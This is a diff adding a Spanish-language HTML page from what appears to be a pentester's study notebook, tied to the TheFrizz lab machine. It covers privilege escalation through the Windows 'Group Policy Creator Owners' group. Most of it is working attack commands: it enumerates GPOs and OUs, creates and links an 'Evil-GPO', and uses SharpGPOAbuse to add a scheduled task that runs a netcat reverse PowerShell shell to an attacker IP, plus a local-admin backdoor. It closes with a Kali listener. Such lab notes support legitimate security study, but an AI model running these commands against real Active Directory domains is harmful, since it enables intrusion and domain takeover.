@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Policy Creator Owners | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="policy-creator-owners">
+          <div class="note-tabbar">
+            <span>Policy Creator Owners</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Grupos</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / grupos</p>
+            <h2>Policy Creator Owners</h2>
+
+            <section class="code-card">
+              <h3>PowerShell: Enumeración</h3>
+              <pre><code># Ver políticas existentes (Podriamos modificarlas con SharpGPOAbuse.exe)
+get-GPO -All
+# Enumerar OU del AD desde CMD
+dsquery ou -limit 0
+# Enumerar OU del AD desde PowerShell
+Import-Module ActiveDirectory
+Get-ADDomainController -Identity &quot;&lt;hostname&gt;&quot; | Select-Object HostName, ComputerObjectDN</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>PowerShell: Crear GPO 'Evil-GPO' maliciosa</h3>
+              <pre><code>New-GPO -Name Evil-GPO | New-GPLink -Target &quot;OU=&lt;ou_ad&gt;,DC=&lt;domain&gt;,DC=&lt;domain&gt;&quot; -LinkEnabled Yes</code></pre>
+            </section>
+
+            <p><a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpGPOAbuse.exe">SharpGPOAbuse.exe</a> + nc.exe</p>
+
+            <section class="code-card">
+              <h3>PowerShell: Abusar GPO</h3>
+              <pre><code># Payload: Ejecutar nc.exe como Administrator
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;EvilTask&quot; --Author &quot;&lt;domain&gt;.&lt;domain&gt;\Administrator&quot; --Command &quot;cmd.exe&quot; --Arguments &quot;/c C:\Users\&lt;user&gt;\nc.exe &lt;kali_ip&gt; 443 -e powershell.exe&quot; --GPOName &quot;Evil-GPO&quot; --Force
+
+# Payload: Añadir a un usuario al grupo Administrator
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount &lt;user&gt; --GPOName &quot;Evil-GPO&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>PowerShell: Forzar que se apliquen las políticas del GPO malicioso</h3>
+              <pre><code>gpupdate /force
+# Listener desde Kali
+rlwrap nc -nlvp 443</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=thefrizz">TheFrizz</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>grupos</span>
+              <span>active_directory</span>
+              <span>policy</span>
+              <span>creator</span>
+              <span>owners</span>
+              <span>gpo</span>
+              <span>grouppolicycreatorowner</span>
+              <span>sharpgpoabuse</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
